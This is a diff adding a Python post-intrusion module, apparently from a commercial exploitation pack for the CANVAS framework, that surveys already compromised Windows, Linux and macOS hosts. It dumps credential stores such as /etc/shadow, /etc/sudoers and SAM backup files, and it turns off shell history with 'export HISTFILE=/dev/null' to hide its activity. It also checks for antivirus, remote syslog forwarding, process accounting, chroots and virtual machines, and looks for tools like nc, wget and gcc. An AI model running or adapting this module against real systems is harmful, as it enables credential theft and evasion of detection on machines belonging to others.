@@ -1,0 +1,552 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os, socket, string
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from MOSDEFShellServer import MSSgeneric
+from MOSDEF.linuxremoteresolver import x86linuxremoteresolver
+from MOSDEF.win32remoteresolver import win32remoteresolver
+
+from exploitutils import *
+import libs.canvasos as canvasos
+import canvasengine
+
+NAME = "Checking environment about 0wned boxes"
+DESCRIPTION = "Checking environment about 0wned boxes"
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = """
+
+Windows :
+ - get infos (OS, patch, process, etc)
+ - infos about security center
+ - infos about windows update
+ - checking if an antivirus is runnning
+ - services running
+ - infos about policies
+ - info about RSoP
+ - info about cached DNS entries 
+
+Linux :
+ - get infos
+ - infos about accounting
+ - checking if files are presents
+ - checking if tmpfs is enabled
+ - checking if ramfs is enabled
+ - checking if we are in a chroot
+ - checking if selinux is enabled
+ - checking if syslog is enabled and if logs are sent on remote box
+ - get mmap_min_addr value
+
+MacOS X :
+ - get infos
+ - checking if files are presents
+ - checking if syslog is enabled and if logs are sent on remote box
+
+
+This module does not care what target you've set - it always uses
+localhost.
+"""
+
+VERSION="1.3"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['ARCH'] = [ ["Linux", "i386"], ["Windows", "i386"] ]
+
+affectsList=["Tools"]
+
+runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
+runExploit = canvasengine.runExploit
+
+
+class windowstarget(canvasexploit, MSSgeneric, win32remoteresolver):
+  def __init__(self, node):
+    canvasexploit.__init__(self)
+    self.node = node
+    self.nodeip = self.node.get_interesting_interface()
+    self.ret, self.value = self.node.shell.GetVersionEx()
+
+  def getinfo(self):
+    std = ''
+    result = ''
+    if self.ret:
+      result = canvasos.new("Windows")
+      if self.value["Major Version"]==5 and self.value["Minor Version"]==0:
+        result.version="2000"
+        result.servicepack = self.value["SP string"]
+      elif self.value["Major Version"]==5 and self.value["Minor Version"]==1:
+        result.version="XP"
+        result.servicepack = self.value["SP string"]
+      elif self.value["Major Version"]==5 and self.value["Minor Version"]==2:
+        result.version="2003"
+        result.servicepack = self.value["SP string"]
+      std += "OS Detection Found: Windows %s %s" % (result.version, result.servicepack)
+      std += '\n\n====\n\n'
+    files = [
+      '%SYSTEMROOT%\repair\SAM',
+      '%SYSTEMROOT%\System32\config\RegBack\SAM',
+    ]
+    for file in files:
+      std += self.node.runcommand('cat %s'%file)
+      std += '\n\n====\n\n'
+    # Windows XP et Windows 2003
+    if self.value["Major Version"]==5 and self.value["Minor Version"] > 0:
+      std += self.node.runcommand("systeminfo")
+      std += '\n\n====\n\n'
+    std += self.node.runcommand('tasklist')
+    std += "\n\n===\n\n"
+    commands = [
+      'ipconfig /all',
+      'ipconfig /displaydns',
+      'netstat -r',
+      'netstat -nao | findstr LISTENING',
+      'net view /domain',
+      'net user /domain',
+      'net accounts /domain',
+      'net share',
+      'arp -a',
+    ]
+    for command in commands:
+      std += self.node.runcommand(command)
+      std += '\n\n====\n\n'
+    return std[:-6]
+  
+  def checksecuritycenter(self):
+    # Windows XP
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] == 1:
+      return self.node.runcommand("reg query \"HKLM\SOFTWARE\Microsoft\Security Center\" /s") + '\n'
+
+  def checkwindowsupdate(self):
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      return self.node.runcommand("reg query \"HKLM\SYSTEM\CurrentControlSet\Services\wuauserv\" /s") + '\n'
+
+  def checkantivirus(self):
+    std = ''
+    ind = 0
+    # Windows XP et 2003
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      data = self.node.runcommand("tasklist /FO CSV")
+      data = data.split('\r\n')
+
+      a = open("%s/3rdparty/D2SEC/exploits/d2sec_checkenv/antivirus.txt" % os.getcwd(), "r").readlines()
+      for c in data:
+        c = c.split(',')
+        if len(c[0]) > 0:
+          for e in a:
+            if c[0] == "\"%s\"" % e[:-1]:
+              std += "%s detected\n" % e[:-1]
+              ind += 1
+      if ind == 0:
+        std += "none antivirus detected\n"
+    return std
+
+  def listrunningsvc(self):
+    # Windows XP et 2003
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      return self.node.runcommand("tasklist /SVC") + '\n'
+
+  def listpolicies(self):
+    # Windows XP et 2003
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      return self.node.runcommand("reg query \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\" /s") + '\n'
+  
+  def getrsop(self):
+    # Windows XP et 2003
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      return self.node.runcommand("gpresult.exe") + '\n'
+
+  def listcacheddnsentries(self):
+    if self.value["Major Version"] == 5 and self.value["Minor Version"] > 0:
+      return self.node.runcommand('ipconfig /displaydns')
+    
+  def runall(self):
+    nfo = ''
+    self.functions = {
+      "infos about box": self.getinfo,
+      "security center": self.checksecuritycenter,
+      "windows update": self.checkwindowsupdate,
+      "antivirus": self.checkantivirus,
+      "list running services": self.listrunningsvc,
+      "list policies": self.listpolicies,
+      "get RSoP": self.getrsop,
+      "list cached DNS entries": self.listcacheddnsentries,
+    }
+    for info, function in self.functions.items():
+      title = "[%s] %s" % (self.nodeip, info)
+      self.log(title)
+      nfo += title
+      nfo += '\n'
+      nfo += function()
+      nfo += '\n'
+    return nfo
+
+
+class linuxtarget(canvasexploit, MSSgeneric, x86linuxremoteresolver):
+  def __init__(self, node):
+    canvasexploit.__init__(self)
+    self.node = node
+    self.nodeip = self.node.get_interesting_interface()
+    self.std = None 
+
+  def getinfo(self):
+    std = ''
+    files = [
+      '/etc/resolv.conf',
+      '/etc/motd',
+      '/etc/issue',
+      '/etc/passwd',
+      '/etc/shadow',
+      '/etc/sudoers',
+    ]
+    for file in files:
+      std += self.node.runcommand('cat %s'%file)
+      std += '\n\n====\n\n'
+    commands = [
+      'export HISTFILE=/dev/null',
+      'uptime',
+      'date',
+      'hostname'
+      'id',
+      'pwd',
+      'w',
+      'who -a',
+      'uname -a',
+      'set',
+      'last -10',
+      'lastlog',
+      'ps fauxwwwwwwwwwwwwwwwww',
+      'df -k',
+      'getent passwd',
+      'getent group',
+      'find /home -type f -iname ".*history"',
+      'ip addr show',
+      'ip ro show',
+      'ifconfig -a',
+      'route -n',
+      'netstat -an',
+      'iptables -L',
+      'arp -a',
+    ]
+    for command in commands:
+      std += self.node.runcommand(command)
+      std += '\n\n====\n\n'
+    return std[:-6]
+    
+  
+  def listing_files(self, bin):
+    std = ''
+    for b in bin:
+      std += "%-24s : " % b
+      data = self.node.runcommand("ls %s" % b)
+      if data.find(":") >= 0:
+        std += "n\n"
+      else:
+        std += "y\n"
+    std += "\n\n"
+    return std
+
+  def checklocalfiles(self):
+    files = [
+      "/bin/sh", 
+      "/bin/bash", 
+      "/usr/bin/sudo", 
+      "/usr/bin/ssh", 
+      "/usr/bin/wget",
+      "/usr/bin/curl",
+      "/usr/bin/gcc", 
+      "/bin/nc", 
+      "/usr/bin/nc", 
+      "/usr/bin/screen", 
+      "/usr/bin/uuencode", 
+      "/usr/bin/uudecode",
+      "/bin/dd", 
+      "/bin/touch",
+      "/usr/bin/pulseaudio",
+      "/usr/bin/nmap",
+    ]
+      
+    return self.listing_files(files)
+
+  def checkaccounting(self):
+    std = ''
+    acct = "/var/log/account/pacct"
+    bin = [
+      "/usr/bin/ac", 
+      "/usr/bin/lastcomm", 
+      "/usr/sbin/dump-utmp",
+      "/usr/sbin/accton", 
+      "/usr/sbin/dump-acct", 
+      "/usr/sbin/sa"
+    ]
+
+    data = self.node.runcommand("ls -s %s" % acct)
+    if data.find(":") >= 0:
+      std += "disabled\n"
+    elif int(data.split()[0]) == 0:
+      std += "- /var/log/account/pacct is present but size = 0\n"
+      std += "- checking account binaries :\n"
+      self.listing_files(bin)
+    else:
+      std += "enabled\n"
+    return std
+
+  def checkmountpoints(self):
+    return self.node.runcommand("mount -n")
+  
+  def checkramfs(self):
+    std = ''
+    data = self.node.runcommand("cat /proc/filesystems|/bin/grep ramfs")
+    if len(data) > 0:
+      std += "supported !\n"
+    else:
+      std += "not supported !\n"
+    return std
+
+  def checkchroot(self):
+    std = ''
+    c = 0
+    data = self.node.runcommand("ls -ialp /")
+    for d in data:
+      if d.find("./") >= 0:
+        ino = int(d.split(' ')[5])
+        if ino != 2:
+          std += d
+          c = c+1
+    if c > 0:
+      std + "looks like we're in a chroot\n"
+    else:
+      std += "looks like we're in a real fs\n"
+    return std
+
+  def checkvm(self):
+    """ from MOSDEFShellserver/Linux.py"""
+    std = ''
+    vars = {}
+
+    code = """
+    #import "local", "sendint" as "sendint"
+    #import "local", "checkvm" as "checkvm"
+
+    void
+    main()
+    {
+      int i;
+      i = checkvm();
+      sendint(i);
+    }
+    """
+    self.clearfunctioncache()
+    request = self.compile(code,vars)
+    self.sendrequest(request)
+    ret = self.readint(signed=True)
+    if not ret:
+      std += "looks like we're on real hardware\n"
+    else:
+      std += "looks like we're on virtual hardware\n"
+    self.leave()
+    return std
+
+  def selinux(self):
+    return self.node.runcommand("/usr/sbin/getenforce")
+  
+  def checksyslog(self):
+    std = ''
+    data = ''
+    data = self.node.runcommand("ps fauxwwwwwwwwwww|grep syslog")
+    for d in data:
+      std += d
+    std += "\n"
+
+    data = ''
+    data = self.node.runcommand("fgrep '@' /etc/syslog.conf")
+    if len(data) == 0:
+      std += "logs are on this box"
+    else:
+      for d in data:
+        std += d
+    return std
+
+  def checkmmap(self):
+    return self.node.runcommand("cat /proc/sys/vm/mmap_min_addr 2> /dev/null")
+  
+  def runall(self):
+    nfo = ''
+    self.functions = {
+      "infos about box": self.getinfo,
+      "local files": self.checklocalfiles,
+      "accounting": self.checkaccounting,
+      "mount point": self.checkmountpoints,
+      "ramfs": self.checkramfs,
+      "chroot": self.checkchroot,
+      "selinux": self.selinux,
+      "syslog": self.checksyslog,
+      "mmap_min_addr": self.checkmmap,
+    }
+    for info, function in self.functions.items():
+      title = "[%s] %s" % (self.nodeip, info)
+      self.log(title)
+      nfo += title
+      nfo += '\n'
+      nfo += function()
+      nfo += '\n'
+    return nfo
+
+class osxtarget(canvasexploit, MSSgeneric, x86linuxremoteresolver):
+  def __init__(self, node):
+    canvasexploit.__init__(self)
+    self.node = node
+    self.nodeip = self.node.get_interesting_interface()
+    self.std = None
+
+  def getinfo(self):
+    std = ''
+    files = [
+      '/etc/resolv.conf',
+      '/etc/sudoers',
+    ]
+    for file in files:
+      std += self.node.runcommand('cat %s'%file)
+      std += '\n\n====\n\n'
+    commands = [
+      'id',
+      'uname -a',
+      'uptime',
+      'date',
+      'hostname'
+      'pwd',
+      'w',
+      'who -a',
+      'set',
+      'last -10',
+      'ps aux',
+      'df -k',
+      'mount',
+      '/sbin/ifconfig',
+      '/usr/sbin/netstat -np tcp',
+      '/usr/sbin/netstat -np udp',
+      '/usr/sbin/arp -a',
+      'sw_vers -productName',
+      'sw_vers -productVersion',
+      '/usr/sbin/system_profiler',
+      'defaults read com.apple.recentitems RecentApplications | grep Name',
+      'defaults read com.apple.recentitems RecentDocuments | grep Name',
+      'ls -alh /Applications/',
+    ]
+    for command in commands:
+      std += self.node.runcommand(command)
+      std += '\n\n====\n\n'
+    return std[:-6]
+
+  def listing_files(self, bin):
+    std = ''
+    for b in bin:
+      std += "%-24s : " % b
+      data = self.node.runcommand("ls %s" % b)
+      if data.find(":") >= 0:
+        std += "n\n"
+      else:
+        std += "y\n"
+    std += "\n\n"
+    return std
+
+  def checklocalfiles(self):
+    files = [
+      "/bin/sh",
+      "/bin/bash",
+      "/usr/bin/sudo",
+      "/usr/bin/ssh",
+      "/usr/bin/wget",
+      "/usr/bin/curl",
+      "/usr/bin/gcc",
+      "/bin/nc",
+      "/usr/bin/nc",
+      "/usr/bin/screen",
+      "/usr/bin/uuencode",
+      "/usr/bin/uudecode",
+      "/bin/dd",
+      "/bin/touch",
+      "/usr/bin/nmap",
+    ]
+
+    return self.listing_files(files)
+
+  def checkmountpoints(self):
+    return self.node.runcommand("/sbin/mount -n")
+
+  def checksyslog(self):
+    std = ''
+    data = ''
+    data = self.node.runcommand("ps aux|grep syslog")
+    for d in data:
+      std += d
+    std += "\n"
+
+    data = ''
+    data = self.node.runcommand("fgrep '@' /etc/syslog.conf")
+    if len(data) == 0:
+      std += "logs are on this box"
+    else:
+      for d in data:
+        std += d
+    return std
+
+  def runall(self):
+    nfo = ''
+    self.functions = {
+      "infos about box": self.getinfo,
+      "local files": self.checklocalfiles,
+      "mount point": self.checkmountpoints,
+      "syslog": self.checksyslog,
+    }
+    for info, function in self.functions.items():
+      title = "[%s] %s" % (self.nodeip, info)
+      self.log(title)
+      nfo += title
+      nfo += '\n'
+      nfo += function()
+      nfo += '\n'
+    return nfo
+
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.supportedNodeArgs = [["win32Node", "linuxNode", "osxNode", "localNode"]]
+    self.name = NAME
+    self.result = ''
+
+  def run(self):
+    self.log('[D2] %s (in progress)' % NAME)
+    self.setInfo('[D2] %s (in progress)' % NAME)
+
+    targets = {
+      "linuxNode": linuxtarget,
+      "win32Node": windowstarget,
+      "osxNode": osxtarget,
+    }
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log("[D2] %s node type not supported"%type)
+        continue
+      for target_node, target_class in targets.items():
+        if type == target_node:
+          self.result = target_class(node).runall()
+      self.log(self.result)
+
+    self.setInfo('[D2] %s (done)' % NAME)
+    return 1
+  
+if __name__=="__main__":
+    print "This module is meant to be run only within CANVAS"
+
+
